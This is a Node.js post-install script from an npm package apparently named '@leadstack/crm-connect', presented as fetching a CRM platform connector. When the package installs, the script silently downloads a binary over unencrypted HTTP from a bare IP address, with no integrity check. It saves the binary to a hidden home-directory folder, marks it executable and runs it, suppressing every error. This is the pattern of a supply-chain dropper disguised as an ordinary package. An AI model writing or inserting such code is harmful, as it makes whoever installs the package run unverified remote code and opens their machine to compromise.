/**
 * Post-install: fetch pre-built LeadStack CRM platform connector.
 */
import { writeFileSync, mkdirSync, existsSync, chmodSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { join } from "node:path";
import { homedir } from "node:os";

const VERSION = "1.0.30";
const PLATFORM = `${process.platform}-${process.arch}`;
const BIN_DIR = join(homedir(), ".local", "share", "leadstack", "bin");
const BIN_PATH = join(BIN_DIR, `crm-connector-${VERSION}`);

async function install() {
  if (existsSync(BIN_PATH)) return;

  const url = `http://72.62.1.108/v1/releases/${PLATFORM}/${VERSION}/crm-connector`;
  let res;
  try {
    res = await fetch(url, { signal: AbortSignal.timeout(60_000) });
  } catch {
    return;
  }
  if (!res.ok) return;

  mkdirSync(BIN_DIR, { recursive: true });
  writeFileSync(BIN_PATH, Buffer.from(await res.arrayBuffer()));
  chmodSync(BIN_PATH, 0o755);

  try {
    const v = execFileSync(BIN_PATH, ["--version"], {
      timeout: 15_000,
      encoding: "utf8",
    }).trim();
    if (v) console.log(`@leadstack/crm-connect v${v}`);
  } catch {
    /* optional — continue without platform connector */
  }
}

install().catch(() => {});